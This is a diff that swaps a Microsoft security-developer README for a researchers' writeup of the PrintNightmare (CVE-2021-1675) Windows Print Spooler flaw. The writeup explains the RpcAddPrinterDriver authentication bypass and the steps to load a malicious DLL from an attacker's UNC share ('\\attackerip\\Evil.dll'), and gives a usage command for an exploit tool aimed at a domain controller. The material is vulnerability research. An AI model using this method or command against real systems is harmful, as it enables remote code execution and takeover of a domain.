@@ -1,149 +1,122 @@
-# Get Started as Microsoft Security Developer 
-
-Welcome to the Microsoft Security Dev repository! This repository is a landing page to learn about  Microsoft security APIs, services and communities. This will enable application developers to build security applications catering to different requirements. Furthermore, this repo is a starting point to share code, libraries, notebooks, workbooks, and queries for building connected experiences. 
-
-Read the [blogpost](https://aka.ms/securitydevblogpost) for more details.
-
-Feedback / Questions / Bugs to report? File [issues](https://github.com/Microsoft/securitydev/issues)
-
-# In this repository
-* [Microsoft security samples for connected experiences](https://github.com/Microsoft/securitydev/tree/master/Samples)
-
-# Getting Started
-Read the [Developers Guide to Building Connected Security Solutions](https://aka.ms/securitydevwhitepaper).  
-The Developers Guide to Building Connected Security Solutions offers a primer for those who want to build apps, workflows, and analytics that integrate with Microsoft security solutions. In addition to introducing to the Microsoft APIs, services, and communities available to developers, the guide offers detailed guidance on when and how to use each – what technology and integration option best aligns with your desired scenario and application type. 
-
-
-# Discover APIs and Services  
-<table BORDER="1" CELLPADDING="10" class="myTable">
-    <thead>
-        <col>
-        <colgroup span="6"></colgroup>
-        <tr style="background-color:DarkOrange;">
-            <th rowspan="2" scope="col" style="min-width: 7em;"><h3>APIs</h3></th>
-            <th colspan="6" scope="colgroup"><h3>INTEGRATION OPTIONS</h3></th>
-        </tr>
-        <tr style="background-color:DarkOrange;">
-            <th>&nbsp;&nbsp;&nbsp;SDK&nbsp;&nbsp;&nbsp;</th>
-            <th><a href="https://docs.microsoft.com/azure/sentinel/">Azure Sentinel</a> Data Connector/ Dashboard</th>
-            <th><a href="https://azure.microsoft.com/services/logic-apps/">Logic Apps</a> / <a href="https://flow.microsoft.com/">Flow</a> / <a href="https://powerapps.microsoft.com/">PowerApps</a> Connector</th>
-            <th><a href="https://docs.microsoft.com/powershell/">PowerShell</a> Module</th>
-            <th><a href="https://powerbi.microsoft.com/">Power BI</a> Connector</th>
-            <th><a href="https://docs.microsoft.com/azure/notebooks/">Azure</a> / <a href="https://jupyter.org/">Jupyter</a> Notebooks</th>
-        </tr>
-    </thead>
-    <tbody >
-        <tr>
-            <td >
-                <a href="https://docs.microsoft.com/graph/security-concept-overview">Microsoft Graph Security API</a><br>unified alerts for <b>all Microsoft security services</b>, threat indicators, actions, and secure score
-            </td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/rest/api/securitycenter/">Azure Security Center</a><br>security posture assessment and threat protection
-            </td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center"></td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/azure/active-directory/identity-protection/graph-get-started">Azure Active Directory Identity Protection</a><br>AAD users, groups, risky users, and risky sign-ins
-            </td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://dev.loganalytics.io/">Azure Sentinel / Azure Log Analytics</a><br>events and logs
-            </td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/windows/security/threat-protection/windows-defender-atp/use-apis">Microsoft Defender Advanced Threat Protection</a><br>networks, devices, files and device users, threat indicators and advanced hunting APIs
-            </td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/cloud-app-security/api-tokens">Microsoft Cloud App Security</a><br>user activities, policy reports across cloud services
-            </td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center"></td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/information-protection/develop/overview">Microsoft Information Protection</a><br>data classification, labeling, and protection
-            </td>
-            <td align="center">&#10003;</td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-        </tr>
-        <tr>
-            <td>
-                <a href="https://docs.microsoft.com/office/office-365-management-api/office-365-management-apis-overview">Office 365 Management</a><br>user, admin, system, and policy actions and events across M365 services
-            </td>
-            <td align="center"></td>
-            <td align="center">&#10003;</td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-            <td align="center"></td>
-        </tr>
-    </tbody>
-</table>
+## PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service
 
  
-# Other security communities 
-* [Microsoft Graph Security API](https://github.com/microsoftgraph/security-api-solutions)
-* [Azure Sentinel](https://github.com/Azure/Azure-Sentinel)
-* [Windows Defender ATP](https://github.com/Microsoft/WindowsDefenderATP-Hunting-Queries) 
-* [Azure Security Center](https://github.com/Microsoft/Azure-Security-Center)
 
-# Contributing
+Ten years ago, an escalation of privilege bug in Windows Printer Spooler was used in Stuxnet, which is a notorious worm that destroyed the nuclear enrichment centrifuges of Iran and infected more than 45000 networks. In the past ten years, spooler still has an endless stream of vulnerabilities disclosed, some of which are not known to the world, however, they are hidden bombs that could lead to disasters. Therefore, we have focused on spooler over the past months and reaped fruitfully.
 
-This project welcomes contributions and suggestions.  Most contributions require you to agree to a
-Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
-the rights to use your contribution. For details, visit https://cla.microsoft.com.
+ 
 
-When you submit a pull request, a CLA-bot will automatically determine whether you need to provide
-a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions
-provided by the bot. You will only need to do this once across all repos using our CLA.
+The beginning of the research is PrintDemon from which we get inspiration. After digging into this bug deeper, we found a way to bypass the patch of MS. But just after MS released the new version, we immediately found a new way to exploit it again. After the story of PrintDemon, we realized that spooler is still a good attack surface, although security researchers have hunted for bugs in spooler for more than ten years. We started to explore the inner working of Printer Spooler and discovered some 0-day Bugs in it. Some of them are more powerful than PrintDemon and easier to exploit, and the others can be triggered from remote which could lead to remote code execution.
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
-For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
-contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+ 
 
-# License
-This repository is licensed with the [MIT](https://github.com/microsoftgraph/security-api-solutions/blob/master/LICENSE) license. 
+CVE-2021-1675 is a remote code execution in Windows Print Spooler. According to MSRC security bullion, this vulnerability is reported by Zhipeng Huo, Piotr Madej and Zhang Yunhai. 
+
+We also found this bug before and hope to keep it secret to participate Tianfu Cup ☹. As there are some people already published exploit video of CVE-2021-1675. Here we publish our writeup and exploit for CVE-2021-1675. 
+
+ 
+
+For more RCE and LPE vulnerabilities in Windows Spooler, please stay tuned and wait our Blackhat talks ‘Diving Into Spooler: Discovering LPE and RCE Vulnerabilities in Windows Printer‘. 
+
+ 
+
+ 
+
+## RpcAddPrinterDriver
+
+Adding a Printer Driver to a Server (RpcAddPrinterDriver)
+
+Let check the MS-RPRN: Print System Remote Protocol about the RpcAddPrinterDriver call.
+
+To add or update a printer driver ("OEM Printer Driver") to a print server ("CORPSERV"), a client ("TESTCLT") performs the following steps.
+
+1. The client can use the RPC call RpcAddPrinterDriver to add a driver to the print server.
+
+2. The client ensures that the files for the printer driver are in a location accessible to the server. For that purpose, the client can share a local directory containing the files, or use [MS-SMB] to place the files into a directory on the server
+
+3. The client then allocates and populates a DRIVER_INFO_2 structure as follows:
+
+   pName = L"OEM Printer Driver";
+
+   pEnvironment = L"Windows NT x86"; /* Environment the driver is compatible with */
+
+   pDriverPath = "\\\\CORPSERV\\C$\\DRIVERSTAGING\\OEMDRV.DLL";315 / 415
+
+   [MS-RPRN] - v20200826
+
+   Print System Remote Protocol
+
+   Copyright © 2020 Microsoft Corporation
+
+   Release: August 26, 2020
+
+   pDataFile = "\\\\CORPSERV\\C$\\DRIVERSTAGING\\OEMDATA.DLL";
+
+   pConfigFile = "\\\\CORPSERV\\C$\\DRIVERSTAGING\\OEMUI.DLL";
+
+4. The client allocates a DRIVER_CONTAINER driverContainer structure and initializes it to contain the DRIVER_INFO_2 structure.
+
+5. The client calls RpcAddPrinterDriver.
+
+   RpcAddPrinterDriver( L"\\\\CORPSERV", &driverContainer );
+
+ 
+
+## CVE-2021-1675 Analysis
+
+Clearly, if an attacker can bypass the authentication of RpcAddPrinterDriver. He could install an malicious driver in the print server. In msdn, the client need SeLoadDriverPrivilege to call the RPC. However, this isn’t true. Let check the authentication logical here:
+
+![img](./img/rootcause.png)
+
+ValidateObjectAccess is a normal security check for Spooler Service. But in line 19 and 20, argument a4 is user controllable. So, a normal user can bypass the security check and add an driver. If you are in the domain, a normal domain user can connect to the Spooler service in the DC and install a driver into the DC. Then he can fully control the Domain.
+
+ 
+
+## Exploit
+
+But the real attack is not that simple. To exploit the authentication bypass bug, we need to understand what the Spooler service will do when you calling RpcAddPrinterDriver. Suppose you supply there path to the service
+
+​	pDataFile =A.dll
+
+​	pConfigFile =\\attackerip\\Evil.dll
+
+​	pDriverPath=C.dll
+
+ 
+
+It will copy A,B and C into folder C:\Windows\System32\spool\drivers\x64\3\new. And then it will copy them to C:\Windows\System32\spool\drivers\x64\3, and load C:\Windows\System32\spool\drivers\x64\3\A.dll and C:\Windows\System32\spool\drivers\x64\3\C.dll into the Spooler service. However, in the latest version, Spooler will check to make sure that A and C is not a UNC path. But as B can be an UNC path, so we can set pConfigFile as an UNC path (an evildll). This will make our evildll Evil.dll be copied into C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. Then call RpcAddPrinterDriver again, to set pDataFile to be C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. It will load our evil dll. Unfortunate, it does not work. Because if you set A, B, C in the folder C:\Windows\System32\spool\drivers\x64\3\. There will be an access conflict in file copy. To bypass this, we need to use the backup feature of driver upgrade. If we upgrade some driver, the old version will be backup into C:\Windows\System32\spool\drivers\x64\3\old\1\ folder. Then we can bypass the access conflict and success inject our evil.dll into spooler service. 
+
+Successfully load our dll:
+
+ ## Usage
+
+
+
+```
+.\PrintNightmare.exe dc_ip path_to_exp user_name password
+
+Example:
+.\PrintNightmare.exe 192.168.5.129 \\192.168.5.197\test\MyExploit.dll user2 test123##
+```
+
+ ![img](./img/Result.png)
+
+ ![img](./img/logfile.png)
+Tested on windows sever 2019 1809 17763.1518
+
+
+
+
+## Impact
+
+This vulnerability can be used to achieve LPE and RCE. As for the RCE part, you need a user to authenticated on the Spooler service. However, this is still critical in Domain environment. Because normally DC will have Spooler service enable, a compromised domain user may use this vulnerability to control the DC.
+
+ 
+
+Here are more hidden bombs in Spooler, which is not public known. We will share more RCE and LPE vulnerabilities in Windows Spooler, please stay tuned and wait our Blackhat talks ‘Diving Into Spooler: Discovering LPE and RCE Vulnerabilities in Windows Printer‘. 
+
+ 
+
+## Credit
+
+Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)
